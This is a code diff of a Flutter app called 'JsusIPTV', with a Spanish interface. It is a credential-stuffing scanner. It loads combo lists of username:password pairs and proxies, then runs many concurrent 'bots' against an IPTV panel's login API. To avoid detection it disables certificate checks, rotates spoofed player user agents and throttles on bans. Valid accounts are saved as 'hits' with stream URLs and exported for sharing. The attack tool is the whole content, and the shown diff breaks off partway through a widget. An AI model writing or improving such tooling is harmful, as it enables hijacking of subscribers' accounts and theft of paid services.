@@ -3,7 +3,6 @@ import 'dart:convert';
 import 'dart:io';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
-import 'package:http/http.dart' as http;
 import 'package:file_picker/file_picker.dart';
 import 'package:share_plus/share_plus.dart';
 import 'package:path_provider/path_provider.dart';
@@ -11,7 +10,6 @@ import 'package:path_provider/path_provider.dart';
 void main() => runApp(const JsusApp());
 
 const cG = Color(0xFF00FF41);
-const cG2 = Color(0xFF00C832);
 const cCy = Color(0xFF00E5FF);
 const cYe = Color(0xFFFFD600);
 const cRe = Color(0xFFFF1744);
@@ -19,7 +17,6 @@ const cMg = Color(0xFFE040FB);
 const cDg = Color(0xFF3A6B3A);
 const cBg = Color(0xFF020402);
 const cBg2 = Color(0xFF060D06);
-const cCd = Color(0xFF080F08);
 const cBr = Color(0xFF0F2A0F);
 
 class ComboItem {
@@ -43,17 +40,20 @@ class HitItem {
   }) : id = DateTime.now().millisecondsSinceEpoch.toString();
 }
 
-final _httpClient = HttpClient()..badCertificateCallback = (_, __, ___) => true;
+final _client = HttpClient()..badCertificateCallback = (_, __, ___) => true;
+
+List<ComboItem> parseCombo(String text) {
+  final lines = <ComboItem>[];
   final seen = <String>{};
-  for (var raw in text.split('\n')) {
-    var line = raw.trim().replaceAll('\r', '').replaceAll('\uFEFF', '');
-    if (line.isEmpty || line.startsWith('#') || line.startsWith('//')) continue;
+  for (final raw in text.split('\n')) {
+    final line = raw.trim().replaceAll('\r', '').replaceAll('\uFEFF', '');
+    if (line.isEmpty || line.startsWith('#')) continue;
     if (!line.contains(':')) continue;
     final idx = line.indexOf(':');
     final user = line.substring(0, idx).trim();
     final pass = line.substring(idx + 1).trim();
     if (user.isEmpty || pass.isEmpty) continue;
-    if (user.startsWith('http') || user.startsWith('www')) continue;
+    if (user.startsWith('http')) continue;
     final key = '$user:$pass';
     if (!seen.contains(key)) {
       seen.add(key);
@@ -63,14 +63,13 @@ final _httpClient = HttpClient()..badCertificateCallback = (_, __, ___) => true;
   return lines;
 }
 
-Future<Map<String, dynamic>?> checkAccount(String panel, String user, String pass, int timeout) async {
+Future<Map<String, dynamic>?> checkAcc(String panel, String user, String pass, int tout) async {
   try {
     final url = '$panel/player_api.php?username=${Uri.encodeComponent(user)}&password=${Uri.encodeComponent(pass)}';
-    final req = await _httpClient.getUrl(Uri.parse(url));
+    final req = await _client.getUrl(Uri.parse(url));
     req.headers.set('User-Agent', _ua());
     req.headers.set('Accept', '*/*');
-    req.headers.set('Connection', 'keep-alive');
-    final res = await req.close().timeout(Duration(seconds: timeout.toInt()));
+    final res = await req.close().timeout(Duration(seconds: tout));
     if (res.statusCode >= 500) return null;
     final body = await res.transform(utf8.decoder).join();
     try {
@@ -88,21 +87,21 @@ Future<Map<String, dynamic>?> checkAccount(String panel, String user, String pas
 
 Future<PanelInfo> verifyPanel(String panel, String user, String pass) async {
   try {
-    final results = await Future.wait([
-      _count(panel, user, pass, 'get_live_streams'),
-      _count(panel, user, pass, 'get_vod_categories'),
-      _count(panel, user, pass, 'get_series_categories'),
+    final r = await Future.wait([
+      _cnt(panel, user, pass, 'get_live_streams'),
+      _cnt(panel, user, pass, 'get_vod_categories'),
+      _cnt(panel, user, pass, 'get_series_categories'),
     ]);
-    return PanelInfo(results[0], results[1], results[2]);
+    return PanelInfo(r[0], r[1], r[2]);
   } catch (_) {
     return PanelInfo(0, 0, 0);
   }
 }
 
-Future<int> _count(String panel, String user, String pass, String action) async {
+Future<int> _cnt(String panel, String user, String pass, String action) async {
   try {
     final url = '$panel/player_api.php?username=${Uri.encodeComponent(user)}&password=${Uri.encodeComponent(pass)}&action=$action';
-    final req = await _httpClient.getUrl(Uri.parse(url));
+    final req = await _client.getUrl(Uri.parse(url));
     req.headers.set('User-Agent', _ua());
     final res = await req.close().timeout(const Duration(seconds: 15));
     final body = await res.transform(utf8.decoder).join();
@@ -113,12 +112,9 @@ Future<int> _count(String panel, String user, String pass, String action) async 
 }
 
 const _uas = [
-  'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0',
-  'VLC/3.0.20 LibVLC/3.0.20',
-  'TiviMate/4.7.0',
-  'IPTVSmarters/3.1.5',
-  'okhttp/4.12.0',
-  'ExoPlayer/2.19.1',
+  'Mozilla/5.0 (Linux; Android 13) Chrome/120.0',
+  'VLC/3.0.20', 'TiviMate/4.7.0', 'IPTVSmarters/3.1.5',
+  'okhttp/4.12.0', 'ExoPlayer/2.19.1',
 ];
 String _ua() => _uas[DateTime.now().millisecondsSinceEpoch % _uas.length];
 
@@ -133,8 +129,8 @@ class JsusApp extends StatelessWidget {
       colorScheme: const ColorScheme.dark(primary: cG),
       fontFamily: 'monospace',
       sliderTheme: const SliderThemeData(
-        activeTrackColor: cG, thumbColor: cG, inactiveTrackColor: cBr,
-        overlayColor: Color(0x2200FF41),
+        activeTrackColor: cG, thumbColor: cG,
+        inactiveTrackColor: cBr, overlayColor: Color(0x2200FF41),
       ),
     ),
     home: const HomeScreen(),
@@ -144,23 +140,23 @@ class JsusApp extends StatelessWidget {
 class HomeScreen extends StatefulWidget {
   const HomeScreen({super.key});
   @override
-  State<HomeScreen> createState() => _HomeState();
+  State<HomeScreen> createState() => _HS();
 }
 
-class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
+class _HS extends State<HomeScreen> with TickerProviderStateMixin {
   int _tab = 0;
-  final _servers = <String>[];
+  final _srvs = <String>[];
   String? _srv;
   final _combo = <ComboItem>[];
-  String _comboName = '';
+  String _cname = '';
   final _proxies = <String>[];
   final _hits = <HitItem>[];
   final _logs = <String>[];
   bool _scanning = false, _paused = false;
-  int _checked = 0, _hitsN = 0, _fails = 0, _bans = 0, _total = 0;
-  int _bots = 20, _timeout = 10;
+  int _checked = 0, _hn = 0, _fails = 0, _bans = 0, _total = 0;
+  int _bots = 20, _tout = 10;
   DateTime? _t0;
-  Timer? _uiTimer;
+  Timer? _timer;
   final _srvCtrl = TextEditingController();
   late AnimationController _ac;
   late Animation<double> _glow;
@@ -173,7 +169,7 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
   }
 
   @override
-  void dispose() { _ac.dispose(); _uiTimer?.cancel(); super.dispose(); }
+  void dispose() { _ac.dispose(); _timer?.cancel(); super.dispose(); }
 
   void _log(String m) => setState(() {
     _logs.insert(0, '[${TimeOfDay.now().format(context)}] $m');
@@ -182,10 +178,13 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
 
   void _toast(String m) => ScaffoldMessenger.of(context).showSnackBar(SnackBar(
     content: Text(m, style: const TextStyle(color: cG)),
-    backgroundColor: cCd,
+    backgroundColor: const Color(0xFF080F08),
     duration: const Duration(seconds: 2),
     behavior: SnackBarBehavior.floating,
-    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(4), side: const BorderSide(color: cBr)),
+    shape: RoundedRectangleBorder(
+      borderRadius: BorderRadius.circular(4),
+      side: const BorderSide(color: cBr),
+    ),
   ));
 
   Future<void> _loadCombo() async {
@@ -193,9 +192,9 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
     if (r == null) return;
     final text = await File(r.files.single.path!).readAsString();
     final parsed = parseCombo(text);
-    setState(() { _combo.clear(); _combo.addAll(parsed); _comboName = r.files.single.name; });
+    setState(() { _combo.clear(); _combo.addAll(parsed); _cname = r.files.single.name; });
     _log('COMBO: ${r.files.single.name} — ${parsed.length} líneas');
-    _toast('✓ ${parsed.length} combos cargados');
+    _toast('✓ ${parsed.length} combos');
   }
 
   Future<void> _loadProxies() async {
@@ -207,13 +206,13 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
     _toast('✓ ${lines.length} proxies');
   }
 
-  void _addServer() {
+  void _addSrv() {
     var url = _srvCtrl.text.trim();
     if (url.isEmpty) { _toast('⚠ Ingresa URL'); return; }
     if (!url.startsWith('http')) url = 'http://$url';
     url = url.replaceAll(RegExp(r'/+$'), '');
-    if (_servers.contains(url)) { _toast('Ya existe'); return; }
-    setState(() { _servers.add(url); _srv = url; });
+    if (_srvs.contains(url)) { _toast('Ya existe'); return; }
+    setState(() { _srvs.add(url); _srv = url; });
     _srvCtrl.clear();
     _toast('✓ Agregado');
     _log('SRV: $url');
@@ -221,9 +220,9 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
   }
 
   Future<void> _verifySrv(String url) async {
-    _log('SRV: Verificando $url...');
+    _log('SRV: Verificando...');
     try {
-      final req = await _httpClient.getUrl(Uri.parse('$url/player_api.php?username=test&password=test'));
+      final req = await _client.getUrl(Uri.parse('$url/player_api.php?username=test&password=test'));
       req.headers.set('User-Agent', _ua());
       final res = await req.close().timeout(const Duration(seconds: 6));
       if (res.statusCode < 500) {
@@ -243,12 +242,11 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
     if (_combo.isEmpty) { _toast('⚠ Carga combo'); return; }
     setState(() {
       _scanning = true; _paused = false;
-      _checked = 0; _hitsN = 0; _fails = 0; _bans = 0;
+      _checked = 0; _hn = 0; _fails = 0; _bans = 0;
       _total = _combo.length; _t0 = DateTime.now();
     });
     _log('SCAN ▶ $_total combos — $_bots bots');
-    _log('SRV: $_srv');
-    _uiTimer = Timer.periodic(const Duration(milliseconds: 400), (_) => setState(() {}));
+    _timer = Timer.periodic(const Duration(milliseconds: 400), (_) => setState(() {}));
     final q = List<ComboItem>.from(_combo)..shuffle();
     await _runScan(q);
   }
@@ -256,12 +254,12 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
   Future<void> _runScan(List<ComboItem> q) async {
     int pos = 0, active = 0;
     final done = Completer<void>();
-    void check() { if (_checked >= _total && active == 0 && !done.isCompleted) done.complete(); }
+    void chk() { if (_checked >= _total && active == 0 && !done.isCompleted) done.complete(); }
 
     Future<void> work(ComboItem item) async {
       while (_paused && _scanning) await Future.delayed(const Duration(milliseconds: 100));
-      if (!_scanning) { active--; check(); return; }
-      final data = await checkAccount(_srv!, item.user, item.pass, _timeout);
+      if (!_scanning) { active--; chk(); return; }
+      final data = await checkAcc(_srv!, item.user, item.pass, _tout);
       setState(() => _checked++);
       if (data != null) {
         final ui = (data['user_info'] as Map?) ?? {};
@@ -275,7 +273,9 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
           final ts = ui['exp_date'];
           if (ts != null) {
             final n = int.tryParse(ts.toString());
-            if (n != null && n > 0) exp = DateTime.fromMillisecondsSinceEpoch(n * 1000).toString().split(' ')[0];
+            if (n != null && n > 0) {
+              exp = DateTime.fromMillisecondsSinceEpoch(n * 1000).toString().split(' ')[0];
+            }
           }
           final hit = HitItem(
             username: item.user, password: item.pass, panel: _srv!,
@@ -285,11 +285,10 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
             m3u: '$_srv/get.php?username=${item.user}&password=${item.pass}&type=m3u_plus',
             timezone: si['timezone']?.toString() ?? '',
           );
-          setState(() { _hits.insert(0, hit); _hitsN++; });
-          _log('HIT #$_hitsN: ${item.user} → $exp');
+          setState(() { _hits.insert(0, hit); _hn++; });
+          _log('HIT #$_hn: ${item.user} → $exp');
           verifyPanel(_srv!, item.user, item.pass).then((info) {
             setState(() => hit.panelInfo = info);
-            _log('PANEL: ${item.user} 📺${info.live} 🎬${info.vod} 📺${info.series}');
           });
         } else {
           setState(() => _fails++);
@@ -299,7 +298,7 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
       }
       final br = _bans / (_checked > 0 ? _checked : 1);
       await Future.delayed(Duration(milliseconds: br > 0.3 ? 200 : br > 0.1 ? 80 : 10));
-      active--; check();
+      active--; chk();
     }
 
     while (pos < q.length && _scanning) {
@@ -307,29 +306,29 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
       else await Future.delayed(const Duration(milliseconds: 20));
     }
     await done.future.timeout(const Duration(hours: 24), onTimeout: () {});
-    _uiTimer?.cancel();
+    _timer?.cancel();
     setState(() => _scanning = false);
-    _log('FIN ✓ Hits: $_hitsN | Fail: $_fails');
-    _toast('✓ Fin — $_hitsN HITs');
+    _log('FIN ✓ Hits: $_hn | Fail: $_fails');
+    _toast('✓ Fin — $_hn HITs');
   }
 
   Future<void> _export() async {
     if (_hits.isEmpty) { _toast('No hay hits'); return; }
-    final buf = StringBuffer('JsusIPTV Scanner — HITS\n${'=' * 50}\n\n');
+    final buf = StringBuffer('JsusIPTV Hits\n${'=' * 40}\n\n');
     for (var i = 0; i < _hits.length; i++) {
       final h = _hits[i];
-      buf.writeln('HIT #${i+1}');
-      buf.writeln('USER   : ${h.username}');
-      buf.writeln('PASS   : ${h.password}');
-      buf.writeln('SERVER : ${h.panel}');
-      buf.writeln('EXPIRA : ${h.expira}');
-      buf.writeln('CONEX  : ${h.activ}/${h.conex}');
+      buf.writeln('HIT #${i + 1}');
+      buf.writeln('USER  : ${h.username}');
+      buf.writeln('PASS  : ${h.password}');
+      buf.writeln('SRV   : ${h.panel}');
+      buf.writeln('EXP   : ${h.expira}');
+      buf.writeln('CONEX : ${h.activ}/${h.conex}');
       if (h.panelInfo != null) {
-        buf.writeln('CANALES: ${h.panelInfo!.live}');
-        buf.writeln('VOD    : ${h.panelInfo!.vod}');
-        buf.writeln('SERIES : ${h.panelInfo!.series}');
+        buf.writeln('TV    : ${h.panelInfo!.live}');
+        buf.writeln('VOD   : ${h.panelInfo!.vod}');
+        buf.writeln('SER   : ${h.panelInfo!.series}');
       }
-      buf.writeln('M3U    : ${h.m3u}');
+      buf.writeln('M3U   : ${h.m3u}');
       buf.writeln('${'─' * 40}\n');
     }
     final dir = await getExternalStorageDirectory();
@@ -342,7 +341,7 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
   String get _elapsed {
     if (_t0 == null) return '00:00:00';
     final d = DateTime.now().difference(_t0!);
-    return '${d.inHours.toString().padLeft(2,'0')}:${(d.inMinutes%60).toString().padLeft(2,'0')}:${(d.inSeconds%60).toString().padLeft(2,'0')}';
+    return '${d.inHours.toString().padLeft(2, '0')}:${(d.inMinutes % 60).toString().padLeft(2, '0')}:${(d.inSeconds % 60).toString().padLeft(2, '0')}';
   }
 
   int get _cpm {
@@ -353,17 +352,36 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
 
   double get _pct => _total > 0 ? _checked / _total : 0;
 
+  String _fmt(int n) {
+    final s = n.toString();
+    final buf = StringBuffer();
+    for (var i = 0; i < s.length; i++) {
+      if (i > 0 && (s.length - i) % 3 == 0) buf.write(',');
+      buf.write(s[i]);
+    }
+    return buf.toString();
+  }
+
+  String _fn(int n) => n >= 1000 ? '${(n / 1000).toStringAsFixed(1)}k' : '$n';
+
+  Color _lc(String l) {
+    if (l.contains('HIT')) return cG;
+    if (l.contains('FAIL') || l.contains('Error')) return cRe;
+    if (l.contains('WARN') || l.contains('PAUS')) return cYe;
+    if (l.contains('PANEL') || l.contains('SRV')) return cCy;
+    return cDg;
+  }
+
   @override
   Widget build(BuildContext context) => Scaffold(
     backgroundColor: cBg,
     body: SafeArea(child: Column(children: [
-      _header(),
-      _nav(),
-      Expanded(child: _content()),
+      _hdr(), _nav(),
+      Expanded(child: _body()),
     ])),
   );
 
-  Widget _header() => Container(
+  Widget _hdr() => Container(
     padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
     color: cBg2,
     child: Row(children: [
@@ -398,11 +416,15 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
               decoration: BoxDecoration(
                 shape: BoxShape.circle,
                 color: _scanning ? cG : cRe,
-                boxShadow: [BoxShadow(color: (_scanning ? cG : cRe).withOpacity(_scanning ? _glow.value : 0.5), blurRadius: 8)],
+                boxShadow: [BoxShadow(
+                  color: (_scanning ? cG : cRe).withOpacity(_scanning ? _glow.value : 0.5),
+                  blurRadius: 8,
+                )],
               ),
             )),
             const SizedBox(width: 4),
-            Text(_scanning ? 'SCAN' : 'IDLE', style: const TextStyle(fontSize: 9, color: cDg, letterSpacing: 1)),
+            Text(_scanning ? 'SCAN' : 'IDLE',
+              style: const TextStyle(fontSize: 9, color: cDg, letterSpacing: 1)),
           ]),
         ),
         StreamBuilder(
@@ -422,22 +444,25 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
         onTap: () => setState(() => _tab = i),
         child: Container(
           padding: const EdgeInsets.symmetric(vertical: 8),
-          decoration: BoxDecoration(border: Border(bottom: BorderSide(color: _tab==i ? cG : Colors.transparent, width: 2))),
+          decoration: BoxDecoration(border: Border(bottom: BorderSide(
+            color: _tab == i ? cG : Colors.transparent, width: 2))),
           child: Column(mainAxisSize: MainAxisSize.min, children: [
             Text(tabs[i].$1, style: const TextStyle(fontSize: 15)),
-            Text(tabs[i].$2, style: TextStyle(fontSize: 10, fontWeight: FontWeight.bold,
-              color: _tab==i ? cG : cDg, letterSpacing: 1,
-              shadows: _tab==i ? const [Shadow(color: cG, blurRadius: 8)] : null)),
+            Text(tabs[i].$2, style: TextStyle(
+              fontSize: 10, fontWeight: FontWeight.bold,
+              color: _tab == i ? cG : cDg, letterSpacing: 1,
+              shadows: _tab == i ? const [Shadow(color: cG, blurRadius: 8)] : null,
+            )),
           ]),
         ),
       )))),
     );
   }
 
-  Widget _content() {
+  Widget _body() {
     switch (_tab) {
       case 0: return _scanTab();
-      case 1: return _configTab();
+      case 1: return _cfgTab();
       case 2: return _hitsTab();
       case 3: return _proxyTab();
       default: return _scanTab();
@@ -446,15 +471,14 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
 
   Widget _scanTab() => ListView(padding: const EdgeInsets.all(10), children: [
     if (_scanning) ...[
-      _card(accent: cG, child: Column(children: [
+      _card(ac: cG, child: Column(children: [
         Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
-          _runBadge(),
-          Text(_elapsed, style: const TextStyle(fontSize: 10, color: cDg)),
+          _rbadge(), Text(_elapsed, style: const TextStyle(fontSize: 10, color: cDg)),
         ]),
         const SizedBox(height: 10),
         Column(children: [
           Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
-            Text('${(_pct*100).toStringAsFixed(1)}%',
+            Text('${(_pct * 100).toStringAsFixed(1)}%',
               style: const TextStyle(fontSize: 14, color: cG, fontFamily: 'monospace',
                 shadows: [Shadow(color: cG, blurRadius: 10)])),
             Text('${_fmt(_checked)} / ${_fmt(_total)}',
@@ -467,42 +491,43 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
         ]),
         const SizedBox(height: 10),
         Row(children: [
-          Expanded(child: _statBox('HITS', '$_hitsN', cG)),
+          Expanded(child: _sbox('HITS', '$_hn', cG)),
           const SizedBox(width: 7),
-          Expanded(child: _statBox('FAIL', _fmt(_fails), cRe)),
+          Expanded(child: _sbox('FAIL', _fmt(_fails), cRe)),
         ]),
         const SizedBox(height: 7),
         Row(children: [
-          Expanded(child: _statBox('BANS', '$_bans', cYe)),
+          Expanded(child: _sbox('BANS', '$_bans', cYe)),
           const SizedBox(width: 7),
-          Expanded(child: _statBox('CPM', _fmt(_cpm), cYe)),
+          Expanded(child: _sbox('CPM', _fmt(_cpm), cYe)),
         ]),
         const SizedBox(height: 10),
         Row(children: [
           Expanded(child: _btn(_paused ? '▶ REANUDAR' : '⏸ PAUSAR',
-            c: _paused ? cG : cYe, onTap: () => setState(() => _paused = !_paused))),
+            c: _paused ? cG : cYe,
+            onTap: () => setState(() => _paused = !_paused))),
           const SizedBox(width: 8),
           Expanded(child: _btn('⬛ DETENER', c: cRe,
-            onTap: () { setState(() => _scanning = false); _uiTimer?.cancel(); })),
+            onTap: () { setState(() => _scanning = false); _timer?.cancel(); })),
         ]),
       ])),
     ] else ...[
-      _card(accent: cCy, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-        _ctitle('SERVIDOR ACTIVO'),
+      _card(ac: cCy, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+        _ct('SERVIDOR ACTIVO'),
         Text(_srv ?? 'Sin servidor configurado',
           style: TextStyle(fontSize: 11, color: _srv != null ? cCy : cDg)),
         const SizedBox(height: 8),
         _sbtn('⚙ CONFIGURAR', c: cCy, onTap: () => setState(() => _tab = 1)),
       ])),
-      _card(accent: cYe, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-        _ctitle('COMBO'),
-        Text(_combo.isEmpty ? 'Sin combo cargado' : '$_comboName — ${_fmt(_combo.length)} líneas',
+      _card(ac: cYe, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+        _ct('COMBO'),
+        Text(_combo.isEmpty ? 'Sin combo cargado' : '$_cname — ${_fmt(_combo.length)} líneas',
           style: TextStyle(fontSize: 11, color: _combo.isEmpty ? cDg : cYe)),
         const SizedBox(height: 8),
         _sbtn('📂 CARGAR COMBO', c: cYe, onTap: _loadCombo),
       ])),
       _card(child: Column(children: [
-        _ctitle('BOTS'),
+        _ct('BOTS'),
         Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
           const Text('SIMULTÁNEOS', style: TextStyle(fontSize: 9, color: cDg, letterSpacing: 2)),
           Text('$_bots', style: const TextStyle(fontSize: 18, color: cG,
@@ -513,11 +538,11 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
         Row(children: [
           Expanded(child: _ibox('PROXY', _proxies.isEmpty ? 'Directo' : '${_proxies.length} px', cMg)),
           const SizedBox(width: 7),
-          Expanded(child: _ibox('TIMEOUT', '${_timeout}s', cCy)),
+          Expanded(child: _ibox('TIMEOUT', '${_tout}s', cCy)),
         ]),
       ])),
       _card(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-        _ctitle('LOG'),
+        _ct('LOG'),
         Container(
           height: 100,
           decoration: BoxDecoration(color: const Color(0xFF010201), borderRadius: BorderRadius.circular(3)),
@@ -533,15 +558,16 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
     ],
   ]);
 
-  Widget _configTab() => ListView(padding: const EdgeInsets.all(10), children: [
+  Widget _cfgTab() => ListView(padding: const EdgeInsets.all(10), children: [
     _sec('SERVIDOR'),
-    _card(accent: cCy, child: Column(children: [
-      _ctitle('AGREGAR'),
+    _card(ac: cCy, child: Column(children: [
+      _ct('AGREGAR'),
       TextField(
         controller: _srvCtrl,
         style: const TextStyle(color: cG, fontSize: 12, fontFamily: 'monospace'),
         decoration: InputDecoration(
-          hintText: 'http://panel.com:8080', hintStyle: const TextStyle(color: cDg, fontSize: 12),
+          hintText: 'http://panel.com:8080',
+          hintStyle: const TextStyle(color: cDg, fontSize: 12),
           filled: true, fillColor: Colors.black54,
           border: OutlineInputBorder(borderRadius: BorderRadius.circular(3), borderSide: const BorderSide(color: cBr)),
           enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(3), borderSide: const BorderSide(color: cBr)),
@@ -550,20 +576,27 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
         ),
       ),
       const SizedBox(height: 8),
-      _btn('✓ AGREGAR', c: cCy, onTap: _addServer),
-      if (_servers.isNotEmpty) ...[
+      _btn('✓ AGREGAR', c: cCy, onTap: _addSrv),
+      if (_srvs.isNotEmpty) ...[
         _sec('ACTIVOS'),
-        ..._servers.asMap().entries.map((e) => Container(
+        ..._srvs.asMap().entries.map((e) => Container(
           margin: const EdgeInsets.only(bottom: 5),
           padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 7),
           decoration: BoxDecoration(color: cBg, borderRadius: BorderRadius.circular(3), border: Border.all(color: cBr)),
           child: Row(children: [
             Expanded(child: Text(e.value, style: const TextStyle(fontSize: 10, color: cCy))),
             GestureDetector(
-              onTap: () => setState(() { _servers.removeAt(e.key); _srv = _servers.isNotEmpty ? _servers[0] : null; }),
-              child: Container(padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
-                decoration: BoxDecoration(color: cRe.withOpacity(0.1), borderRadius: BorderRadius.circular(3), border: Border.all(color: cRe.withOpacity(0.3))),
-                child: const Text('✕', style: TextStyle(color: cRe, fontSize: 12))),
+              onTap: () => setState(() {
+                _srvs.removeAt(e.key);
+                _srv = _srvs.isNotEmpty ? _srvs[0] : null;
+              }),
+              child: Container(
+                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
+                decoration: BoxDecoration(
+                  color: cRe.withOpacity(0.1), borderRadius: BorderRadius.circular(3),
+                  border: Border.all(color: cRe.withOpacity(0.3))),
+                child: const Text('✕', style: TextStyle(color: cRe, fontSize: 12)),
+              ),
             ),
           ]),
         )),
@@ -573,11 +606,11 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
     _card(child: Column(children: [
       Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
         const Text('SEGUNDOS', style: TextStyle(fontSize: 9, color: cDg, letterSpacing: 2)),
-        Text('${_timeout}s', style: const TextStyle(fontSize: 18, color: cG,
+        Text('${_tout}s', style: const TextStyle(fontSize: 18, color: cG,
           shadows: [Shadow(color: cG, blurRadius: 8)], fontFamily: 'monospace')),
       ]),
-      Slider(value: _timeout.toDouble(), min: 5, max: 30,
-        onChanged: (v) => setState(() => _timeout = v.round())),
+      Slider(value: _tout.toDouble(), min: 5, max: 30,
+        onChanged: (v) => setState(() => _tout = v.round())),
     ])),
   ]);
 
@@ -585,7 +618,8 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
     Padding(padding: const EdgeInsets.all(10), child: Row(
       mainAxisAlignment: MainAxisAlignment.spaceBetween,
       children: [
-        Text('TOTAL: ${_hits.length}', style: const TextStyle(fontSize: 12, color: cDg, fontWeight: FontWeight.bold, letterSpacing: 2)),
+        Text('TOTAL: ${_hits.length}',
+          style: const TextStyle(fontSize: 12, color: cDg, fontWeight: FontWeight.bold, letterSpacing: 2)),
         Row(children: [
           _sbtn('💾 EXPORTAR', c: cCy, onTap: _export),
           const SizedBox(width: 6),
@@ -594,12 +628,13 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
       ],
     )),
     Expanded(child: _hits.isEmpty
-      ? Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
-          const Text('🎯', style: TextStyle(fontSize: 32)),
-          const SizedBox(height: 8),
-          const Text('LOS HITS APARECERÁN AQUÍ', style: TextStyle(fontSize: 10, color: cDg, letterSpacing: 1)),
+      ? const Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
+          Text('🎯', style: TextStyle(fontSize: 32)),
+          SizedBox(height: 8),
+          Text('LOS HITS APARECERÁN AQUÍ', style: TextStyle(fontSize: 10, color: cDg, letterSpacing: 1)),
         ]))
-      : ListView.builder(padding: const EdgeInsets.symmetric(horizontal: 10),
+      : ListView.builder(
+          padding: const EdgeInsets.symmetric(horizontal: 10),
           itemCount: _hits.length,
           itemBuilder: (_, i) => _hitCard(_hits[i]))),
   ]);
@@ -617,40 +652,42 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
       ),
     ),
     child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-      Padding(padding: const EdgeInsets.fromLTRB(12,10,12,8), child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+      Padding(padding: const EdgeInsets.fromLTRB(12, 10, 12, 8), child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start, children: [
         Text('👤 ${h.username}', style: const TextStyle(color: cG, fontSize: 13, fontWeight: FontWeight.bold)),
         Text('🔑 ${h.password}', style: const TextStyle(color: cDg, fontSize: 10)),
         Text('🖥 ${h.panel}', style: const TextStyle(color: cCy, fontSize: 9)),
         const SizedBox(height: 6),
         Wrap(spacing: 5, runSpacing: 4, children: [
-          _badge('📅 ${h.expira}', cYe),
-          _badge('🔗 ${h.activ}/${h.conex}', cCy),
-          _badge('✓ ${h.status}', cG),
-          if (h.timezone.isNotEmpty) _badge('🌍 ${h.timezone}', cMg),
+          _bdg('📅 ${h.expira}', cYe),
+          _bdg('🔗 ${h.activ}/${h.conex}', cCy),
+          _bdg('✓ ${h.status}', cG),
+          if (h.timezone.isNotEmpty) _bdg('🌍 ${h.timezone}', cMg),
         ]),
       ])),
       Container(
-        padding: const EdgeInsets.fromLTRB(12,8,12,8),
+        padding: const EdgeInsets.fromLTRB(12, 8, 12, 8),
         decoration: BoxDecoration(border: Border(top: BorderSide(color: cG.withOpacity(0.08)))),
         child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
           const Text('📊 PANEL', style: TextStyle(fontSize: 10, color: cDg, letterSpacing: 2)),
           const SizedBox(height: 8),
           h.panelInfo == null
             ? const Row(children: [
-                SizedBox(width:14,height:14,child:CircularProgressIndicator(strokeWidth:2,color:cG)),
-                SizedBox(width:8),
-                Text('Verificando...', style: TextStyle(fontSize:10,color:cDg)),
+                SizedBox(width: 14, height: 14,
+                  child: CircularProgressIndicator(strokeWidth: 2, color: cG)),
+                SizedBox(width: 8),
+                Text('Verificando...', style: TextStyle(fontSize: 10, color: cDg)),
               ])
             : Row(children: [
-                Expanded(child: _pbox('📺', '${h.panelInfo!.live}', 'CANALES', cG)),
-                const SizedBox(width:5),
-                Expanded(child: _pbox('🎬', '${h.panelInfo!.vod}', 'VOD', cCy)),
-                const SizedBox(width:5),
-                Expanded(child: _pbox('📺', '${h.panelInfo!.series}', 'SERIES', cMg)),
+                Expanded(child: _pbox(_fn(h.panelInfo!.live), 'CANALES', cG)),
+                const SizedBox(width: 5),
+                Expanded(child: _pbox(_fn(h.panelInfo!.vod), 'VOD', cCy)),
+                const SizedBox(width: 5),
+                Expanded(child: _pbox(_fn(h.panelInfo!.series), 'SERIES', cMg)),
               ]),
         ]),
       ),
-      Padding(padding: const EdgeInsets.fromLTRB(12,0,12,10), child: Row(children: [
+      Padding(padding: const EdgeInsets.fromLTRB(12, 0, 12, 10), child: Row(children: [
